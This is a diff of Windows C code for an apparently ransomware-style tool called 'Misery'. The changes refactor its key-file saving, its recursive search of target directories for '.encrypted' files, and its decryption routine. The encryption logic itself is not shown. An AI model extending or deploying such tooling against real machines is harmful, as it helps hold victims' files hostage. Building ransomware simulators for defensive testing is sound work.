@@ -57,14 +57,8 @@ static void GenerateRawKey(BYTE *key, DWORD keySize) {
 static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
     int savedCount = 0;
     char saltHex[33], keyHex[65];
-
-    for (DWORD i = 0; i < SALT_SIZE; i++)
-        sprintf(saltHex + i * 2, "%02x", salt[i]);
-    saltHex[32] = '\0';
-
-    for (DWORD i = 0; i < keyLen; i++)
-        sprintf(keyHex + i * 2, "%02x", rawKey[i]);
-    keyHex[64] = '\0';
+    bytes_to_hex(salt, SALT_SIZE, saltHex);
+    bytes_to_hex(rawKey, keyLen, keyHex);
 
     /* Location 1: %TEMP% — guaranteed outside all target dirs */
     char tempPath[MAX_PATH];
@@ -147,103 +141,70 @@ static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
 }
 
 /* ===================================================================
- * FIX: Recursively find the first .encrypted file and extract its salt.
- * Searches all target directories and their subdirectories.
+ * STEP 6: Recursive helper for finding .encrypted files
+ * Searches all subdirectories recursively until first .encrypted found
+ * =================================================================== */
+static bool FindEncryptedFileRecursive(const WCHAR *root, BYTE *outSalt,
+                                        char *outPath, size_t outPathSize) {
+    WCHAR searchPath[FILEOPS_MAX_PATH];
+    _snwprintf(searchPath, FILEOPS_MAX_PATH - 1, L"%s\\*", root);
+
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileExW(searchPath, FindExInfoStandard, &fd,
+                                     FindExSearchNameMatch, NULL, 0);
+    if (hFind == INVALID_HANDLE_VALUE) return false;
+
+    do {
+        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
+            continue;
+
+        WCHAR fullPath[FILEOPS_MAX_PATH];
+        _snwprintf(fullPath, FILEOPS_MAX_PATH - 1, L"%s\\%s", root, fd.cFileName);
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            /* Recurse into subdirectory */
+            if (FindEncryptedFileRecursive(fullPath, outSalt, outPath, outPathSize)) {
+                FindClose(hFind);
+                return true;
+            }
+        } else {
+            /* Check if this file ends with .encrypted */
+            size_t len = wcslen(fullPath);
+            if (len >= 11 && _wcsicmp(fullPath + len - 10, L".encrypted") == 0) {
+                /* Found .encrypted file; read salt */
+                HANDLE hFile = CreateFileW(fullPath, GENERIC_READ,
+                    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    DWORD rb = 0;
+                    if (ReadFile(hFile, outSalt, SALT_SIZE, &rb, NULL) && rb == SALT_SIZE) {
+                        WideCharToMultiByte(CP_UTF8, 0, fullPath, -1,
+                            outPath, (int)outPathSize, NULL, NULL);
+                        CloseHandle(hFile);
+                        FindClose(hFind);
+                        return true;
+                    }
+                    CloseHandle(hFile);
+                }
+            }
+        }
+    } while (FindNextFileW(hFind, &fd) != 0);
+
+    FindClose(hFind);
+    return false;
+}
+
+/* ===================================================================
+ * STEP 6: Simplified FindFirstEncryptedFileAndSalt using recursive helper
+ * Searches all target directories and their subdirectories at any depth
  * =================================================================== */
 static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
                                            size_t outPathSize) {
     for (int i = 0; g_target_dirs[i]; i++) {
-        /* Build wide-path for recursive search */
         WCHAR wideRoot[FILEOPS_MAX_PATH];
         MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1,
                             wideRoot, FILEOPS_MAX_PATH);
-
-        WCHAR pattern[FILEOPS_MAX_PATH];
-        _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", wideRoot);
-
-        WIN32_FIND_DATAW fdw;
-        HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
-                                         &fdw, FindExSearchNameMatch, NULL, 0);
-        if (hFind == INVALID_HANDLE_VALUE) continue;
-
-        do {
-            if (!wcscmp(fdw.cFileName, L".") || !wcscmp(fdw.cFileName, L".."))
-                continue;
-
-            WCHAR fullPath[FILEOPS_MAX_PATH];
-            _snwprintf(fullPath, FILEOPS_MAX_PATH - 1, L"%s\\%s",
-                       wideRoot, fdw.cFileName);
-
-            if (fdw.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                /* Recurse into subdirectory */
-                WCHAR subPattern[FILEOPS_MAX_PATH];
-                _snwprintf(subPattern, FILEOPS_MAX_PATH - 1, L"%s\\*", fullPath);
-
-                WIN32_FIND_DATAW fdSub;
-                HANDLE hSub = FindFirstFileExW(subPattern, FindExInfoStandard,
-                                                &fdSub, FindExSearchNameMatch, NULL, 0);
-                if (hSub != INVALID_HANDLE_VALUE) {
-                    do {
-                        if (!wcscmp(fdSub.cFileName, L".") ||
-                            !wcscmp(fdSub.cFileName, L"..")) continue;
-
-                        WCHAR subFull[FILEOPS_MAX_PATH];
-                        _snwprintf(subFull, FILEOPS_MAX_PATH - 1, L"%s\\%s",
-                                   fullPath, fdSub.cFileName);
-
-                        /* Check if it ends with .encrypted */
-                        size_t len = wcslen(subFull);
-                        if (len >= 11 &&
-                            _wcsicmp(subFull + len - 10, L".encrypted") == 0) {
-                            /* Found .encrypted file; read salt */
-                            HANDLE hFile = CreateFileW(subFull, GENERIC_READ,
-                                                       FILE_SHARE_READ, NULL,
-                                                       OPEN_EXISTING,
-                                                       FILE_ATTRIBUTE_NORMAL, NULL);
-                            if (hFile != INVALID_HANDLE_VALUE) {
-                                DWORD rb = 0;
-                                if (ReadFile(hFile, outSalt, SALT_SIZE, &rb, NULL) &&
-                                    rb == SALT_SIZE) {
-                                    WideCharToMultiByte(CP_UTF8, 0, subFull, -1,
-                                                        outPath, (int)outPathSize,
-                                                        NULL, NULL);
-                                    CloseHandle(hFile);
-                                    FindClose(hSub);
-                                    FindClose(hFind);
-                                    return true;
-                                }
-                                CloseHandle(hFile);
-                            }
-                        }
-                    } while (FindNextFileW(hSub, &fdSub));
-                    FindClose(hSub);
-                }
-            } else {
-                /* Root-level file — check for .encrypted */
-                size_t len = wcslen(fullPath);
-                if (len >= 11 &&
-                    _wcsicmp(fullPath + len - 10, L".encrypted") == 0) {
-                    HANDLE hFile = CreateFileW(fullPath, GENERIC_READ,
-                                               FILE_SHARE_READ, NULL,
-                                               OPEN_EXISTING,
-                                               FILE_ATTRIBUTE_NORMAL, NULL);
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD rb = 0;
-                        if (ReadFile(hFile, outSalt, SALT_SIZE, &rb, NULL) &&
-                            rb == SALT_SIZE) {
-                            WideCharToMultiByte(CP_UTF8, 0, fullPath, -1,
-                                                outPath, (int)outPathSize,
-                                                NULL, NULL);
-                            CloseHandle(hFile);
-                            FindClose(hFind);
-                            return true;
-                        }
-                        CloseHandle(hFile);
-                    }
-                }
-            }
-        } while (FindNextFileW(hFind, &fdw));
-        FindClose(hFind);
+        if (FindEncryptedFileRecursive(wideRoot, outSalt, outPath, outPathSize))
+            return true;
     }
     return false;
 }
@@ -282,11 +243,9 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     }
 
     BYTE rawKey[RAW_KEY_SIZE];
-    for (size_t i = 0; i < RAW_KEY_SIZE; i++) {
-        if (sscanf(keyHex + i * 2, "%2hhx", &rawKey[i]) != 1) {
-            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Invalid hex character in key");
-            return false;
-        }
+    if (!hex_to_bytes(keyHex, hexLen, rawKey, sizeof(rawKey))) {
+        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse hex key (hex_to_bytes)");
+        return false;
     }
 
     /* Find first encrypted file and extract salt */
@@ -312,6 +271,24 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
         MiseryLog(MISERY_LOG_ERROR, "Decrypt: InitCryptoRaw failed: %s",
                   GetErrorString(cerr));
         return false;
+    }
+
+    /* STEP 7: Diagnostic logging after successful crypto init */
+    {
+        BYTE *ctx_salt = GetCryptoCtx()->salt;
+        char saltDbg[33];
+        bytes_to_hex(ctx_salt, SALT_SIZE, saltDbg);
+        MiseryLog(MISERY_LOG_INFO, "Decrypt: Using salt=%s from file: %s",
+                  saltDbg, testEncPath);
+        
+        /* Also log the extracted salt from the encrypted file for comparison */
+        char extractedSalt[33];
+        bytes_to_hex(salt, SALT_SIZE, extractedSalt);
+        MiseryLog(MISERY_LOG_INFO, "Decrypt: Extracted salt from file=%s (match: %s)",
+                  extractedSalt, (strcmp(saltDbg, extractedSalt) == 0) ? "YES" : "NO");
+        
+        /* Note: Deriving a hash from the AES key requires additional crypto operations.
+           For now, the salt match and successful test-decrypt below serve as verification. */
     }
 
     /* FIX: Verify key by test-decrypting one file.
@@ -583,12 +560,17 @@ int main(int argc, char **argv) {
 
         /* Convert hex to raw bytes */
         BYTE salt[SALT_SIZE] = {0};
-        for (int i = 0; i < SALT_SIZE; i++)
-            sscanf(saltHex + i * 2, "%2hhx", &salt[i]);
+        if (!hex_to_bytes(saltHex, strlen(saltHex), salt, sizeof(salt))) {
+            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse salt hex");
+            return 1;
+        }
 
         BYTE rawKey[RAW_KEY_SIZE];
-        for (int i = 0; i < RAW_KEY_SIZE; i++)
-            sscanf(keyHex + i * 2, "%2hhx", &rawKey[i]);
+        if (!hex_to_bytes(keyHex, strlen(keyHex), rawKey, sizeof(rawKey))) {
+            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to parse key hex");
+            SecureZeroMemory(rawKey, sizeof(rawKey));
+            return 1;
+        }
 
         CleanupCrypto();
         CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, salt);
